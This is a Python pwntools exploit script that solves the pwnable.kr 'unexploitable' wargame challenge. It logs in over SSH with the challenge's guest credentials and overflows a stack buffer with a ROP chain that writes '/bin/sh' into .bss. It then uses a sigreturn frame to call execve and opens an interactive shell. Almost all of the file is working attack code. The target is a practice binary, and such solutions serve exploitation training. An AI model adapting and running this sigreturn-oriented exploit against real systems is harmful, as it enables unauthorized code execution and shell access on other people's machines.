#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

# imports

from pwn import *
import time

context.log_level = "debug"
context.arch = 'amd64'
#p = process("./unexploitable")
con = ssh(host="pwnable.kr", port = 2222, user = "unexploitable", password="guest")
p = con.process("./unexploitable")
syscall = 0x400560
read_plt = 0x400430
#we need a /bin/sh on the .bss
set_rsi = 0x4005fb
target_addr = 0x601030 + 0x20
frame = SigreturnFrame(kernel = "amd64")
#execve("/bin/sh",0,0)
frame.rdi = target_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
frame.rax = 0x3b

payload = "a" * 0x18 + p64(set_rsi) + p64(target_addr) * 7 + p64(read_plt) + p64(syscall) + str(frame)

payload1 = "/bin/sh\x00".ljust(0xe,"\x00")

raw_input("halt.")

p.sendline(payload)
time.sleep(3)
p.sendline(payload1)
time.sleep(3)
p.interactive()
